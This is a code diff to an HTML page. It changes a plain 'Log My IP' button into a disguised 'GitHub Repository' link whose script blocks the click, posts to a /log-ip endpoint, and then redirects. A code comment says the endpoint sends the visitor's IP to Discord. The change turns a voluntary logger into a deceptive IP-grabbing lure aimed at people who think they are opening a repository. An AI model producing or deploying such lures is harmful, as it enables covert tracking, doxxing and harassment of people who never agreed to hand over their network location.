@@ -3,21 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IP Logger</title>
+  <title>GitHub Link IP Logger</title>
 </head>
 <body>
-  <h1>IP Logger</h1>
-  <button id="log-ip-btn">Log My IP</button>
+  <h1>Click on the GitHub Link Below</h1>
+  <a href="https://github.com/your-username/your-repo" id="github-link">GitHub Repository</a>
 
   <script>
-    // When the button is clicked, it triggers the IP logging process
-    document.getElementById('log-ip-btn').addEventListener('click', function() {
+    document.getElementById('github-link').addEventListener('click', function(e) {
+      // Prevent the default behavior of the link (so the page doesn't reload)
+      e.preventDefault();
+
+      // Send a request to your server to log the IP and send it to Discord
       fetch('/log-ip', {
         method: 'POST',
       })
       .then(response => response.text())
       .then(data => {
-        alert(data); // Show success message
+        alert('IP Logged Successfully!'); // Show success message
+        // After logging the IP, redirect the user to the GitHub link
+        window.location.href = "https://github.com/your-username/your-repo"; // Redirect after logging IP
       })
       .catch(error => {
         console.error('Error:', error);
